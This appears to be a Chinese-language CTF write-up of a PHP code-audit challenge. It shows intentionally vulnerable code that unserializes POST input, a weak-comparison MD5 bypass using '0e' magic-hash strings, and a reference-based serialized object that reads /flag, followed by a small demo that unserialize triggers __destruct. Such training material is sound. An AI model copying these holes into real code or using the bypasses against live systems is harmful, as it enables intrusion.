

#### 代码审计漏洞

```php
<?php
/**
 * Created by PhpStorm.
 * User: jinzhao
 * Date: 2019/10/6
 * Time: 8:04 PM
 */

highlight_file(__FILE__);

class BUU {
   public $correct = "";
   public $input = "";

   public function __destruct() {
       try {
           $this->correct = base64_encode(uniqid());
           if($this->correct === $this->input) {
               echo file_get_contents("/flag");
           }
       } catch (Exception $e) {
       }
   }
}

if($_GET['pleaseget'] === '1') {
    if($_POST['pleasepost'] === '2') {
        if(md5($_POST['md51']) == md5($_POST['md52']) && $_POST['md51'] != $_POST['md52']) {
            unserialize($_POST['obj']);
        }
    }
}
```

**代码审计过程:**

```sh
上面代码可利用反序列化漏洞运行:
1.弱md5绕过 if 判断
2.在 unserialize 函数执行反序列化的时候,会运行类的魔术方法,比如上面类BUU中的 __destruct 方法	#对普通方法无效
------------------------------
#弱md5绕过:
#原理:在 PHP 中使用 ==（弱等于）进行比较时，如果字符串的格式看起来像科学计数法，PHP 会自动将其转换为数字
#0e12345 意味着 0 x 10^12345，结果等于 0
找两个 MD5 都是 0e 开头的不同字符串，如 QNKCDZO 和 240610708

#构建序列化对象:
$a = new BUU();
$a->input = &$a->correct; 	# 将 input 设置为 correct 的引用
echo serialize($a);

```

#### 序列化补充测试

code.php:

```php
<?php
        class buu{
                public function __destruct(){
                        echo "buu exit...";
                }

        }

        echo "hello";
        echo "<br>";
        unserialize($_GET['obj']);
```

直接运行 `http://xx.xx/code.php`  只会输出: `hello`

code2.php:

```php
<?php
        class buu{
                public function __destruct(){
                        echo "buu exit...";
                }

        }
        $bu = new buu();
        //echo "hello";
        echo serialize($bu);
```

运行 `php code2.php`, 拿到对象buu的序列化串: `O:3:"buu":0:{}`

此时访问 `http://xx.xx/code.php?obj=O:3:"buu":0:{}` ,输出:

hello
buu exit...

由此,对象 `buu` 的析构方法 `__destruct`  执行了